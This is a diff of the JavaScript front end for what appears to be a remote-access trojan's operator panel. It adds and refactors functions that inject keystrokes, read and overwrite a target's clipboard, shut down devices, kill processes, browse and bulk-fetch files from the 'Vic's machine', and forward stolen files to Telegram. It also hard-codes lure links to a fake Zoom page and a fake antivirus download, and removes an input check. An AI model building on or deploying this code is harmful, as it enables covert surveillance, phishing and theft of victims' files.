-    if (!currentDeviceId) return;
+async function rcLiveSpecial(keyName) {
+    if (!state.currentDeviceId) return;
     await rcLiveFlush();
-    await api('/api/control/key', 'POST', { deviceId: currentDeviceId, key: keyName })
-        .catch(() => {});
+    await api('/api/control/key', 'POST',
+        { deviceId: state.currentDeviceId, key: keyName }).catch(() => {});
 }
 
-async function rcLiveQueueHotkey(combo) {
-    if (!currentDeviceId) return;
+async function rcLiveHotkey(combo) {
+    if (!state.currentDeviceId) return;
     await rcLiveFlush();
-    await api('/api/control/hotkey', 'POST', { deviceId: currentDeviceId, keys: combo })
-        .catch(() => {});
+    await api('/api/control/hotkey', 'POST',
+        { deviceId: state.currentDeviceId, keys: combo }).catch(() => {});
 }
 
 async function rcLiveFlush() {
-    if (liveTypingTimer) { clearTimeout(liveTypingTimer); liveTypingTimer = null; }
-    const text = liveTypingBuffer;
-    liveTypingBuffer = '';
-    if (!text || !currentDeviceId) return;
+    if (state.liveTimer) { clearTimeout(state.liveTimer); state.liveTimer = null; }
+    const text = state.liveBuffer;
+    state.liveBuffer = '';
+    if (!text || !state.currentDeviceId) return;
     await api('/api/control/text', 'POST', {
-        deviceId: currentDeviceId,
+        deviceId: state.currentDeviceId,
         text,
     }).catch(() => {});
-    rcLog(`⌨️ Sent ${text.length} char(s) to remote focused window`, 'info');
+    rcLog(`⌨️ Sent ${text.length} char(s)`, 'info');
 }
 
-window.addEventListener('beforeunload', () => {
-    if (liveTypingEnabled) rcLiveFlush();
-});
-
 // ============================================================
-// GODMODE ACTIONS
+// CLIPBOARD / POWER / KILL
 // ============================================================
 async function rcClipboardGet() {
-    if (!currentDeviceId) return;
-    rcLog('📋 Fetching clipboard from device...', 'info');
-    const r = await rcSendAndTrack('/api/control/clipboard-get', {}, 'Get clipboard',
-        { attempts: 20 });
+    if (!state.currentDeviceId) return;
+    rcLog('📋 Fetching clipboard…', 'info');
+    const r = await rcSendAndTrack('/api/control/clipboard-get', {},
+        'Get clipboard', { attempts: 20 });
     if (r && r.ok && r.data !== undefined) {
         try {
             await navigator.clipboard.writeText(String(r.data || ''));
-            const preview = String(r.data || '').substring(0, 60);
-            rcLog(`✅ Clipboard copied: "${preview}${preview.length === 60 ? '…' : ''}"`, 'success');
-            toast('Remote clipboard copied to your PC', 'success');
-        } catch (e) {
-            rcLog('⚠️ Device returned clipboard but browser refused to write: ' + e.message, 'warn');
-            rcLog('📋 Remote clipboard content: ' + String(r.data || '').substring(0, 200), 'info');
+            rcLog(`✅ Clipboard copied (${String(r.data || '').length} chars)`, 'success');
+            toast('Remote clipboard copied', 'success');
+        } catch (_) {
+            rcLog('⚠️ Clipboard blocked — content: ' +
+                  String(r.data || '').substring(0, 200), 'warn');
         }
     }
 }
 
 async function rcClipboardSet() {
-    if (!currentDeviceId) return;
+    if (!state.currentDeviceId) return;
     let text = '';
     try {
         text = await navigator.clipboard.readText();
-    } catch (e) {
-        rcLog('⚠️ Browser refused to read your clipboard: ' + e.message, 'warn');
-        text = prompt('Paste the text you want to send to the device:') || '';
+    } catch (_) {
+        text = prompt('Text to send to remote clipboard:') || '';
     }
-    if (!text) { rcLog('⚠️ Clipboard is empty', 'warn'); return; }
-    await rcSendAndTrack('/api/control/clipboard-set', { text }, 'Set clipboard',
-        { attempts: 15 });
+    if (!text) { rcLog('⚠️ Clipboard empty', 'warn'); return; }
+    await rcSendAndTrack('/api/control/clipboard-set', { text },
+        'Set clipboard', { attempts: 15 });
 }
 
 async function rcPower(action) {
-    if (!currentDeviceId) return;
+    if (!state.currentDeviceId) return;
     const labels = {
         shutdown: 'SHUT DOWN', restart: 'RESTART',
         logoff: 'LOG OFF', sleep: 'PUT TO SLEEP',
     };
     if (!confirm(`Really ${labels[action] || action} the remote device?`)) return;
-    rcLog(`⚡ Sending power command: ${action}`, 'warn');
-    toast(`Sending ${action}...`, 'warn');
+    rcLog(`⚡ Power: ${action}`, 'warn');
     await rcSendAndTrack('/api/control/power', { action }, `Power: ${action}`,
-        { attempts: 10, silentSuccess: false });
+        { attempts: 10 });
 }
 
 async function rcKillProcess() {
-    if (!currentDeviceId) return;
+    if (!state.currentDeviceId) return;
     const name = document.getElementById('rcKillInput').value.trim();
     if (!name) return;
-    if (!/^[\w.\- ]+\.exe$/i.test(name) && !/^[\w.\- ]+$/i.test(name)) {
-        rcLog('⚠️ Invalid process name', 'warn');
-        toast('Invalid process name', 'warn');
-        return;
-    }
     if (!confirm(`Kill process "${name}" on remote device?`)) return;
     await rcSendAndTrack('/api/control/kill', { name }, `Kill: ${name}`,
         { attempts: 15 });
@@ -1861,172 +2069,176 @@ async function rcKillProcess() {
 }
 
 // ============================================================
-// PARENT LINK GENERATORS
+// LINK GENERATORS
 // ============================================================
 const PARENT_LINKS = {
     zoom:      'https://uswebzoomcall.pacon.eu.cc/zoom.html',
-    antivirus: 'https://pacon.eu.cc/download.html'
+    antivirus: 'https://pacon.eu.cc/download.html',
 };
 
-let _lastGeneratedLink  = '';
-let _lastGeneratedLabel = '';
+function _showLink(label, url) {
+    state.lastGeneratedLink = url;
+    state.lastGeneratedLabel = label;
 
-function _rcShowLink(label, url) {
-    _lastGeneratedLink  = url;
-    _lastGeneratedLabel = label;
-
-    const box    = document.getElementById('rcLinkOutput');
-    const lblEl  = document.getElementById('rcLinkLabel');
+    document.getElementById('rcLinkLabel').textContent = label + ':';
     const anchor = document.getElementById('rcLinkAnchor');
-
-    if (!box || !lblEl || !anchor) return;
-
-    lblEl.textContent  = label + ':';
     anchor.textContent = url;
-    anchor.href        = url;
-    box.style.display  = 'block';
+    anchor.href = url;
+    document.getElementById('rcLinkOutput').style.display = 'block';
 
-    rcCopyLinkOutput(true);
+    _copyLink(true);
     rcLog(`🔗 Generated ${label}: ${url}`, 'success');
 }
 
-function rcGenerateZoomLink() {
-    _rcShowLink('Zoom call link', PARENT_LINKS.zoom);
-    toast('Zoom link generated & copied', 'success', 2500);
-}
-
-function rcGenerateAntivirusLink() {
-    _rcShowLink('Antivirus download link', PARENT_LINKS.antivirus);
-    toast('Antivirus link generated & copied', 'success', 2500);
-}
-
-async function rcCopyLinkOutput(silent = false) {
-    if (!_lastGeneratedLink) return;
+async function _copyLink(silent = false) {
+    if (!state.lastGeneratedLink) return;
     try {
-        await navigator.clipboard.writeText(_lastGeneratedLink);
+        await navigator.clipboard.writeText(state.lastGeneratedLink);
         if (!silent) {
-            toast('Link copied to clipboard', 'success', 1800);
-            rcLog('📋 Link copied: ' + _lastGeneratedLink, 'info');
+            toast('Link copied', 'success', 1800);
+            rcLog('📋 Link copied', 'info');
         } else {
-            rcLog('📋 Link auto-copied: ' + _lastGeneratedLink, 'info');
+            rcLog('📋 Link auto-copied', 'info');
         }
-    } catch (e) {
+    } catch (_) {
         const ta = document.createElement('textarea');
-        ta.value = _lastGeneratedLink;
+        ta.value = state.lastGeneratedLink;
         ta.style.position = 'fixed';
-        ta.style.opacity  = '0';
+        ta.style.opacity = '0';
         document.body.appendChild(ta);
         ta.select();
-        try {
-            document.execCommand('copy');
-            if (!silent) toast('Link copied to clipboard', 'success', 1800);
-            rcLog('📋 Link copied (fallback): ' + _lastGeneratedLink, 'info');
-        } catch (e2) {
-            if (!silent) {
-                prompt('Copy this link manually:', _lastGeneratedLink);
-            }
-        }
+        try { document.execCommand('copy'); } catch (_) {}
         document.body.removeChild(ta);
     }
 }
 
-function rcOpenLinkOutput() {
-    if (!_lastGeneratedLink) return;
-    window.open(_lastGeneratedLink, '_blank', 'noopener');
-    rcLog('🌐 Opened link: ' + _lastGeneratedLink, 'info');
+function _openLink() {
+    if (!state.lastGeneratedLink) return;
+    window.open(state.lastGeneratedLink, '_blank', 'noopener');
 }
 
-async function rcSendLinkTelegram() {
-    if (!_lastGeneratedLink) return;
-    const label = _lastGeneratedLabel || 'Link';
-    const text  = `🛡️ <b>PACON ${escapeHtml(label)}</b>\n\n${escapeHtml(_lastGeneratedLink)}`;
-    rcLog(`📤 Sending ${label} to Telegram…`, 'info');
+async function _sendLinkTg() {
+    if (!state.lastGeneratedLink) return;
+    const label = state.lastGeneratedLabel || 'Link';
+    const text = `🛡️ <b>PACON ${escapeHtml(label)}</b>\n\n${escapeHtml(state.lastGeneratedLink)}`;
     const r = await api('/api/telegram/send-text', 'POST', { text });
     if (r && r.success) {
         rcLog('✅ Link sent to Telegram', 'success');
-        toast('Link sent to Telegram', 'success');
+        toast('Link sent', 'success');
     } else {
-        rcLog('❌ Telegram send failed: ' + ((r && r.error) || 'unknown'), 'error');
-        toast('Send failed', 'error');
+        rcLog('❌ Telegram failed', 'error');
     }
 }
 
 // ============================================================
 // FILE BROWSER
 // ============================================================
-let currentPath = '';
-
 async function rcListDir() {
-    if (!currentDeviceId) return;
+    if (!state.currentDeviceId) return;
     const path = document.getElementById('rcPathInput').value || '';
-    currentPath = path;
+    state.currentPath = path;
     const list = document.getElementById('rcFileList');
     list.innerHTML = '<div style="text-align:center;padding:12px;"><div class="spinner-ring" style="margin:0 auto;width:24px;height:24px;"></div></div>';
 
-    const r = await rcSendAndTrack('/api/control/list-dir', { path }, `List: ${path || '~'}`,
-        { attempts: 20, silentSuccess: true });
+    const r = await rcSendAndTrack('/api/control/list-dir', { path },
+        `List: ${path || '~'}`, { attempts: 20, silentSuccess: true });
 
     if (!r || !r.ok) {
-        list.innerHTML = '<div style="color:var(--red);font-size:10px;padding:8px;text-align:center;">Failed to list directory</div>';
+                list.innerHTML = '<div style="color:var(--red);font-size:10px;padding:8px;text-align:center;">Failed to list</div>';
         return;
     }
     let entries = r.data || [];
-    if (!showHiddenFiles) {
+    if (!state.showHiddenFiles) {
         entries = entries.filter(e => !e.name.startsWith('.'));
     }
-    updateBreadcrumb(path);
+    _updateBreadcrumb(path);
     if (entries.length === 0) {
         list.innerHTML = '<div style="color:var(--text-secondary);font-size:10px;padding:8px;text-align:center;">Empty directory</div>';
         return;
     }
-    list.innerHTML = entries.map(e => {
-        const sizeStr = e.is_dir ? '' : formatBytes(e.size);
-        const icon = e.is_dir ? 'fas fa-folder' : 'fas fa-file';
-        const iconColor = e.is_dir ? '#d29922' : '#8b949e';
-        const safePathJs = encodeURIComponent(e.path);
-        const isDir = e.is_dir ? 'true' : 'false';
-        return `
-            <div class="file-item" style="cursor:default;">
-                <i class="${icon}" style="color:${iconColor};"
-                   onclick="rcNavTo(decodeURIComponent('${safePathJs}'), ${isDir})"></i>
-                <span style="flex:1;overflow:hidden;text-overflow:ellipsis;cursor:pointer;"
-                      onclick="rcNavTo(decodeURIComponent('${safePathJs}'), ${isDir})"
-                      title="${escapeHtml(e.path)}">${escapeHtml(e.name)}</span>
-                <span class="size">${sizeStr}</span>
-                ${!e.is_dir ? `
-                    <button class="btn-ctrl" style="padding:1px 6px;font-size:9px;margin-left:4px;"
-                            title="Download to my PC"
-                            onclick="event.stopPropagation();rcFetchFilePath(decodeURIComponent('${safePathJs}'))">
-                        <i class="fas fa-download"></i>
-                    </button>
-                    <button class="btn-ctrl" style="padding:1px 6px;font-size:9px;margin-left:2px;"
-                            title="Grab from child &amp; send to Telegram"
-                            onclick="event.stopPropagation();rcFetchAndTgFile(decodeURIComponent('${safePathJs}'))">
-                        <i class="fab fa-telegram"></i>
-                    </button>
-                ` : ''}
-            </div>
-        `;
-    }).join('');
+
+    list.innerHTML = '';
+    entries.forEach(e => {
+        const row = document.createElement('div');
+        row.className = 'file-item';
+
+        const icon = document.createElement('i');
+        icon.className = e.is_dir ? 'fas fa-folder' : 'fas fa-file';
+        icon.style.color = e.is_dir ? '#d29922' : '#8b949e';
+        icon.style.cursor = 'pointer';
+        icon.addEventListener('click', () => rcNavTo(e.path, e.is_dir));
+
+        const nameEl = document.createElement('span');
+        nameEl.className = 'file-name';
+        nameEl.textContent = e.name;
+        nameEl.title = e.path;
+        nameEl.style.cursor = 'pointer';
+        nameEl.addEventListener('click', () => rcNavTo(e.path, e.is_dir));
+
+        const sizeEl = document.createElement('span');
+        sizeEl.className = 'size';
+        sizeEl.textContent = e.is_dir ? '' : formatBytes(e.size);
+
+        row.appendChild(icon);
+        row.appendChild(nameEl);
+        row.appendChild(sizeEl);
+
+        if (!e.is_dir) {
+            const dlBtn = document.createElement('button');
+            dlBtn.className = 'btn-ctrl';
+            dlBtn.style.cssText = 'padding:1px 6px;font-size:9px;margin-left:4px;';
+            dlBtn.title = 'Download to my PC';
+            dlBtn.innerHTML = '<i class="fas fa-download"></i>';
+            dlBtn.addEventListener('click', (ev) => {
+                ev.stopPropagation();
+                rcFetchFilePath(e.path);
+            });
+
+            const tgBtn = document.createElement('button');
+            tgBtn.className = 'btn-ctrl';
+            tgBtn.style.cssText = 'padding:1px 6px;font-size:9px;margin-left:2px;';
+            tgBtn.title = 'Grab & send to Telegram';
+            tgBtn.innerHTML = '<i class="fab fa-telegram"></i>';
+            tgBtn.addEventListener('click', (ev) => {
+                ev.stopPropagation();
+                rcFetchAndTgFile(e.path);
+            });
+
+            row.appendChild(dlBtn);
+            row.appendChild(tgBtn);
+        }
+
+        list.appendChild(row);
+    });
 }
 
-function updateBreadcrumb(path) {
+function _updateBreadcrumb(path) {
     const bc = document.getElementById('rcBreadcrumb');
     if (!path) {
         bc.innerHTML = '<span style="color:var(--text-secondary);font-size:10px;">No path yet</span>';
         return;
     }
+    bc.innerHTML = '';
     const parts = path.replace(/\//g, '\\').split('\\').filter(p => p);
     let accum = '';
-    const crumbs = parts.map((p, i) => {
+    parts.forEach((p, i) => {
         accum = i === 0 ? p + '\\' : accum + (accum.endsWith('\\') ? '' : '\\') + p;
         const isLast = i === parts.length - 1;
-        const cls = isLast ? 'crumb current' : 'crumb';
-        const safeAccum = accum.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
-        return `<span class="${cls}" onclick="rcQuickPath('${safeAccum}')">${escapeHtml(p)}</span>` +
-               (isLast ? '' : '<span class="sep">\\</span>');
-    }).join('');
-    bc.innerHTML = crumbs;
+        const crumb = document.createElement('span');
+        crumb.className = 'crumb' + (isLast ? ' current' : '');
+        crumb.textContent = p;
+        if (!isLast) {
+            const target = accum;
+            crumb.addEventListener('click', () => rcQuickPath(target));
+        }
+        bc.appendChild(crumb);
+        if (!isLast) {
+            const sep = document.createElement('span');
+            sep.className = 'sep';
+            sep.textContent = '\\';
+            bc.appendChild(sep);
+        }
+    });
 }
 
 function rcNavTo(path, isDir) {
@@ -2044,8 +2256,8 @@ function rcQuickPath(path) {
 }
 
 function rcFileUp() {
-    if (!currentPath) return;
-    const parts = currentPath.replace(/\//g, '\\').split('\\').filter(p => p);
+    if (!state.currentPath) return;
+    const parts = state.currentPath.replace(/\//g, '\\').split('\\').filter(p => p);
     if (parts.length <= 1) return;
     parts.pop();
     let newPath = parts.join('\\');
@@ -2054,50 +2266,56 @@ function rcFileUp() {
 }
 
 function rcToggleHidden() {
-    showHiddenFiles = !showHiddenFiles;
-    prefs.hiddenFiles = showHiddenFiles;
+    state.showHiddenFiles = !state.showHiddenFiles;
     savePrefs();
     const btn = document.getElementById('rcHiddenToggle');
-    btn.classList.toggle('active', showHiddenFiles);
-    btn.querySelector('i').className = showHiddenFiles ? 'fas fa-eye' : 'fas fa-eye-slash';
-    if (currentPath) rcListDir();
-}
-
-function formatBytes(n) {
-    if (!n) return '';
-    if (n < 1024) return n + ' B';
-    if (n < 1024 * 1024) return (n / 1024).toFixed(1) + ' KB';
-    if (n < 1024 * 1024 * 1024) return (n / 1024 / 1024).toFixed(1) + ' MB';
-    return (n / 1024 / 1024 / 1024).toFixed(2) + ' GB';
+    btn.classList.toggle('active', state.showHiddenFiles);
+    btn.querySelector('i').className = state.showHiddenFiles ? 'fas fa-eye' : 'fas fa-eye-slash';
+    if (state.currentPath) rcListDir();
 }
 
 // ============================================================
-// RECEIVED FILES + FETCH
+// FETCH / RECEIVED FILES
 // ============================================================
-async function rcFetchFilePrompt() {
-    if (!currentDeviceId) { toast('Select a device first', 'warn'); return; }
-    const path = prompt(
-        "Absolute path on the Vic's machine to grab:\n" +
-        "Example: C:\\Users\\Kid\\Desktop\\homework.pdf"
-    );
-    if (!path) return;
-    rcFetchFilePath(path);
-}
-
 async function rcFetchFilePath(path) {
-    if (!currentDeviceId || !path) return;
+    if (!state.currentDeviceId || !path) return;
     rcLog(`📥 Requesting file: ${path}`, 'info');
     const r = await rcSendAndTrack('/api/control/fetch-file', { path },
         `Fetch ${path.split('\\').pop()}`, { attempts: 40 });
     if (r && r.ok) {
         rcLog('✅ File uploaded to server', 'success');
-        toast('File received — see Received Files panel', 'success');
+        toast('File received', 'success');
+        setTimeout(() => rcLoadReceivedFiles(true), 1500);
+    }
+}
+
+async function rcFetchFilePrompt() {
+    if (!state.currentDeviceId) { toast('Select a device first', 'warn'); return; }
+    const path = prompt("Absolute path on the Vic's machine:\nExample: C:\\Users\\Kid\\Desktop\\file.pdf");
+    if (!path) return;
+    rcFetchFilePath(path);
+}
+
+async function rcFetchFolderPrompt() {
+    if (!state.currentDeviceId) { toast('Select a device first', 'warn'); return; }
+    const path = prompt("Folder on the Vic's machine:\nExample: C:\\Users\\Kid\\Documents");
+    if (!path) return;
+    const glob = prompt("Glob pattern (e.g. *.pdf, *.txt, *):", "*") || "*";
+    const max  = parseInt(prompt("Max files (1–50):", "20")) || 20;
+
+    rcLog(`📥 Fetching ${path}\\${glob} (max ${max})`, 'info');
+    const r = await rcSendAndTrack('/api/control/fetch-folder',
+        { path, glob, max }, `Fetch ${path}`, { attempts: 60 });
+    if (r && r.ok) {
+        const sent = (r.data && r.data.sent) || 0;
+        rcLog(`✅ Fetched ${sent} file(s)`, 'success');
+        toast(`Fetched ${sent} file(s)`, 'success');
         setTimeout(() => rcLoadReceivedFiles(true), 1500);
     }
 }
 
 async function rcFetchAndTgFile(path) {
-    if (!currentDeviceId || !path) return;
+    if (!state.currentDeviceId || !path) return;
     const base = path.split('\\').pop() || path.split('/').pop() || path;
 
     rcLog(`📥 Grabbing ${base} from child…`, 'info');
@@ -2105,39 +2323,35 @@ async function rcFetchAndTgFile(path) {
 
     const r = await rcSendAndTrack('/api/control/fetch-file', { path },
         `Fetch ${base}`, { attempts: 40 });
-
     if (!r || !r.ok) {
         rcLog('❌ Fetch failed — cannot send to Telegram', 'error');
         return;
     }
-    rcLog('✅ File uploaded to server', 'success');
+    rcLog('✅ Uploaded to server', 'success');
 
     const match = await _waitForReceivedFile(base, 8000);
     if (!match) {
-        rcLog('⚠️ Fetched file not indexed yet — try "Received" button', 'warn');
-        toast('File fetched but not indexed — try "Received"', 'warn');
+        rcLog('⚠️ Fetched file not indexed yet — try "Received"', 'warn');
+        toast('File not indexed yet', 'warn');
         setTimeout(() => rcLoadReceivedFiles(true), 1000);
         return;
     }
-
     rcLog(`📤 Sending ${match.filename} → Telegram…`, 'info');
     await rcTelegramReceived(match.dev_folder, match.filename);
 }
 
 async function rcFetchFolderAndTg() {
-    if (!currentDeviceId) { toast('Select a device first', 'warn'); return; }
+    if (!state.currentDeviceId) { toast('Select a device first', 'warn'); return; }
     const path = document.getElementById('rcPathInput').value || '';
     if (!path) { toast('Enter a folder path first', 'warn'); return; }
     const glob = prompt(`Glob pattern for ${path}\n(e.g. *.pdf, *.txt, *):`, "*") || "*";
     const max  = parseInt(prompt("Max files (1–50):", "20")) || 20;
 
     rcLog(`📥 Fetching ${path}\\${glob} (max ${max}) → Telegram…`, 'info');
-    toast(`Fetching up to ${max} files from ${path}…`, 'info');
+    toast(`Fetching up to ${max} files…`, 'info');
 
     const r = await rcSendAndTrack('/api/control/fetch-folder',
-        { path, glob, max },
-        `Fetch folder ${path}`, { attempts: 60 });
-
+        { path, glob, max }, `Fetch ${path}`, { attempts: 60 });
     if (!r || !r.ok) {
         rcLog('❌ Fetch folder failed', 'error');
         return;
@@ -2146,20 +2360,18 @@ async function rcFetchFolderAndTg() {
     rcLog(`✅ Fetched ${sent} file(s)`, 'success');
 
     await rcLoadReceivedFiles(true);
-    if (!receivedFiles.length) {
+    if (!state.receivedFiles.length) {
         toast('No received files to send', 'warn');
         return;
     }
-
-    const toSend = receivedFiles.slice(0, sent || receivedFiles.length);
-    if (toSend.length > 10 &&
-        !confirm(`Send ${toSend.length} files to Telegram?`)) return;
+    const toSend = state.receivedFiles.slice(0, sent || state.receivedFiles.length);
+    if (toSend.length > 10 && !confirm(`Send ${toSend.length} files to Telegram?`)) return;
 
     let ok = 0, fail = 0;
     for (const f of toSend) {
-        const url = `/api/telegram/send-file/${encodeURIComponent(f.filename)}`
-                  + `?source=received&dev_folder=${encodeURIComponent(f.dev_folder)}`
-                  + (currentDeviceId ? `&deviceId=${encodeURIComponent(currentDeviceId)}` : '');
+        const url = `/api/telegram/send-file/${encodeURIComponent(f.filename)}` +
+                    `?source=received&dev_folder=${encodeURIComponent(f.dev_folder)}` +
+                    (state.currentDeviceId ? `&deviceId=${encodeURIComponent(state.currentDeviceId)}` : '');
         const rr = await api(url, 'POST');
         if (rr && rr.success) ok++; else fail++;
         await new Promise(res => setTimeout(res, 350));
@@ -2173,7 +2385,7 @@ async function _waitForReceivedFile(base, timeoutMs = 8000) {
     const deadline = Date.now() + timeoutMs;
     while (Date.now() < deadline) {
         await rcLoadReceivedFiles(true);
-        const match = receivedFiles.find(f =>
+        const match = state.receivedFiles.find(f =>
             f.filename === base ||
             f.filename.startsWith(stem) ||
             (f.source_path && f.source_path.endsWith(base))
@@ -2184,79 +2396,86 @@ async function _waitForReceivedFile(base, timeoutMs = 8000) {
     return null;
 }
 
-async function rcFetchFolderPrompt() {
-    if (!currentDeviceId) { toast('Select a device first', 'warn'); return; }
-    const path = prompt(
-        "Folder on the Vic's machine:\n" +
-        "Example: C:\\Users\\Kid\\Documents"
-    );
-    if (!path) return;
-    const glob = prompt("Glob pattern (e.g. *.pdf, *.txt, *):", "*") || "*";
-    const max  = parseInt(prompt("Max files (1–50):", "20")) || 20;
-    rcLog(`📥 Fetching ${path}\\${glob} (max ${max})`, 'info');
-    const r = await rcSendAndTrack('/api/control/fetch-folder',
-        { path, glob, max },
-        `Fetch folder ${path}`, { attempts: 60 });
-    if (r && r.ok) {
-        const sent = (r.data && r.data.sent) || 0;
-        rcLog(`✅ Fetched ${sent} file(s)`, 'success');
-        toast(`Fetched ${sent} file(s)`, 'success');
-        setTimeout(() => rcLoadReceivedFiles(true), 1500);
-    }
-}
-
 async function rcLoadReceivedFiles(force = false) {
-    if (!currentDeviceId) {
+    if (!state.currentDeviceId) {
         document.getElementById('rcReceivedFiles').innerHTML =
             '<div style="color:var(--text-secondary);font-size:10px;padding:8px;text-align:center;">Select a device</div>';
         return;
     }
-    const data = await api('/api/files/received?deviceId=' + encodeURIComponent(currentDeviceId));
+    const data = await api('/api/files/received?deviceId=' + encodeURIComponent(state.currentDeviceId));
     if (!data || !data.success) return;
-    receivedFiles = data.files || [];
-    renderReceivedFiles();
+    state.receivedFiles = data.files || [];
+    _renderReceivedFiles();
 }
 
-function renderReceivedFiles() {
+function _renderReceivedFiles() {
     const el = document.getElementById('rcReceivedFiles');
-    if (!receivedFiles.length) {
+    if (!state.receivedFiles.length) {
         el.innerHTML = '<div style="color:var(--text-secondary);font-size:10px;padding:8px;text-align:center;">No files received yet</div>';
         return;
     }
-    el.innerHTML = receivedFiles.map(f => {
-        const size = formatBytes(f.size);
-        const name = escapeHtml(f.filename);
-        const safeDev = escapeHtml(f.dev_folder || '');
-        const safeName = escapeHtml(f.filename || '');
-        return `
-            <div class="file-item" style="cursor:default;">
-                <i class="fas fa-file" style="color:#79c0ff;"></i>
-                <span style="flex:1;overflow:hidden;text-overflow:ellipsis;" title="${escapeHtml(f.source_path || '')}">${name}</span>
-                <span class="size">${size}</span>
-                <button class="btn-ctrl" style="padding:1px 6px;font-size:9px;margin-left:4px;"
-                        title="Download"
-                        onclick="event.stopPropagation();rcDownloadReceived('${safeDev}','${safeName}')">
-                    <i class="fas fa-download"></i>
-                </button>
-                <button class="btn-ctrl" style="padding:1px 6px;font-size:9px;margin-left:2px;"
-                        title="Send to Telegram"
-                        onclick="event.stopPropagation();rcTelegramReceived('${safeDev}','${safeName}')">
-                    <i class="fab fa-telegram"></i>
-                </button>
-                <button class="btn-ctrl danger" style="padding:1px 6px;font-size:9px;margin-left:2px;"
-                        title="Delete"
-                        onclick="event.stopPropagation();rcDeleteReceived('${safeDev}','${safeName}')">
-                    <i class="fas fa-trash"></i>
-                </button>
-            </div>
-        `;
-    }).join('');
+    el.innerHTML = '';
+    state.receivedFiles.forEach(f => {
+        const row = document.createElement('div');
+        row.className = 'file-item';
+
+        const icon = document.createElement('i');
+        icon.className = 'fas fa-file';
+        icon.style.color = '#79c0ff';
+
+        const nameEl = document.createElement('span');
+        nameEl.className = 'file-name';
+        nameEl.textContent = f.filename;
+        nameEl.title = f.source_path || '';
+
+        const sizeEl = document.createElement('span');
+        sizeEl.className = 'size';
+        sizeEl.textContent = formatBytes(f.size);
+
+        const dlBtn = document.createElement('button');
+        dlBtn.className = 'btn-ctrl';
+        dlBtn.style.cssText = 'padding:1px 6px;font-size:9px;margin-left:4px;';
+        dlBtn.title = 'Download';
+        dlBtn.innerHTML = '<i class="fas fa-download"></i>';
+        dlBtn.addEventListener('click', (ev) => {
+            ev.stopPropagation();
+            rcDownloadReceived(f.dev_folder, f.filename);
+        });
+
+        const tgBtn = document.createElement('button');
+        tgBtn.className = 'btn-ctrl';
+        tgBtn.style.cssText = 'padding:1px 6px;font-size:9px;margin-left:2px;';
+        tgBtn.title = 'Send to Telegram';
+        tgBtn.innerHTML = '<i class="fab fa-telegram"></i>';
+        tgBtn.addEventListener('click', (ev) => {
+            ev.stopPropagation();
+            rcTelegramReceived(f.dev_folder, f.filename);
+        });
+
+        const delBtn = document.createElement('button');
+        delBtn.className = 'btn-ctrl danger';
+        delBtn.style.cssText = 'padding:1px 6px;font-size:9px;margin-left:2px;';
+        delBtn.title = 'Delete';
+        delBtn.innerHTML = '<i class="fas fa-trash"></i>';
+        delBtn.addEventListener('click', (ev) => {
+            ev.stopPropagation();
+            rcDeleteReceived(f.dev_folder, f.filename);
+        });
+
+        row.appendChild(icon);
+        row.appendChild(nameEl);
+        row.appendChild(sizeEl);
+        row.appendChild(dlBtn);
+        row.appendChild(tgBtn);
+        row.appendChild(delBtn);
+        el.appendChild(row);
+    });
 }
 
 function rcDownloadReceived(devFolder, filename) {
-    const url = API_URL + '/api/files/received/'
-              + encodeURIComponent(devFolder) + '/'
-              + encodeURIComponent(filename);
+    const url = API_URL + '/api/files/received/' +
+                encodeURIComponent(devFolder) + '/' +
+                encodeURIComponent(filename);
     const a = document.createElement('a');
     a.href = url;
     a.download = filename;
@@ -2267,43 +2486,45 @@ function rcDownloadReceived(devFolder, filename) {
 }
 
 async function rcTelegramReceived(devFolder, filename) {
-    rcLog(`📤 Sending ${filename} to Telegram…`, 'info');
-    const url = `/api/telegram/send-file/${encodeURIComponent(filename)}`
-              + `?source=received&dev_folder=${encodeURIComponent(devFolder)}`
-              + (currentDeviceId ? `&deviceId=${encodeURIComponent(currentDeviceId)}` : '');
+    rcLog(`📤 Sending ${filename} → Telegram…`, 'info');
+    const url = `/api/telegram/send-file/${encodeURIComponent(filename)}` +
+                `?source=received&dev_folder=${encodeURIComponent(devFolder)}` +
+                (state.currentDeviceId ? `&deviceId=${encodeURIComponent(state.currentDeviceId)}` : '');
     const r = await api(url, 'POST');
     if (r && r.success) {
         rcLog('✅ Sent to Telegram', 'success');
         toast('Sent to Telegram', 'success');
     } else {
-        rcLog('❌ Telegram send failed: ' + ((r && r.error) || 'unknown'), 'error');
+        rcLog('❌ Telegram failed: ' + ((r && r.error) || 'unknown'), 'error');
         toast('Send failed', 'error');
     }
 }
 
 async function rcDeleteReceived(devFolder, filename) {
-    if (!confirm(`Delete ${filename} from the server?`)) return;
+    if (!confirm(`Delete ${filename} from server?`)) return;
     const url = `/api/files/received/${encodeURIComponent(devFolder)}/${encodeURIComponent(filename)}`;
     const r = await api(url, 'DELETE');
     if (r && r.success) {
-        receivedFiles = receivedFiles.filter(
-            f => !(f.dev_folder === devFolder && f.filename === filename));
-        renderReceivedFiles();
+        state.receivedFiles = state.receivedFiles.filter(
+            f => !(f.dev_folder === devFolder && f.filename === filename)
+        );
+        _renderReceivedFiles();
         rcLog(`🗑️ Deleted ${filename}`, 'info');
     }
 }
 
-async function rcSendAllReceivedToTelegram() {
-    if (!currentDeviceId) { toast('Select a device first', 'warn'); return; }
+async function rcSendAllReceivedTg() {
+    if (!state.currentDeviceId) { toast('Select a device', 'warn'); return; }
     await rcLoadReceivedFiles(true);
-    if (!receivedFiles.length) { toast('No files to send', 'warn'); return; }
-    if (receivedFiles.length > 10 &&
-        !confirm(`Send all ${receivedFiles.length} files to Telegram?`)) return;
+    if (!state.receivedFiles.length) { toast('No files to send', 'warn'); return; }
+    if (state.receivedFiles.length > 10 &&
+        !confirm(`Send all ${state.receivedFiles.length} files to Telegram?`)) return;
+
     let ok = 0, fail = 0;
-    for (const f of receivedFiles) {
-        const url = `/api/telegram/send-file/${encodeURIComponent(f.filename)}`
-                  + `?source=received&dev_folder=${encodeURIComponent(f.dev_folder)}`
-                  + (currentDeviceId ? `&deviceId=${encodeURIComponent(currentDeviceId)}` : '');
+    for (const f of state.receivedFiles) {
+        const url = `/api/telegram/send-file/${encodeURIComponent(f.filename)}` +
+                    `?source=received&dev_folder=${encodeURIComponent(f.dev_folder)}` +
+                    (state.currentDeviceId ? `&deviceId=${encodeURIComponent(state.currentDeviceId)}` : '');
         const r = await api(url, 'POST');
         if (r && r.success) ok++; else fail++;
         await new Promise(res => setTimeout(res, 350));
@@ -2313,42 +2534,43 @@ async function rcSendAllReceivedToTelegram() {
 }
 
 // ============================================================
-// APP DRAWER
+// APPS
 // ============================================================
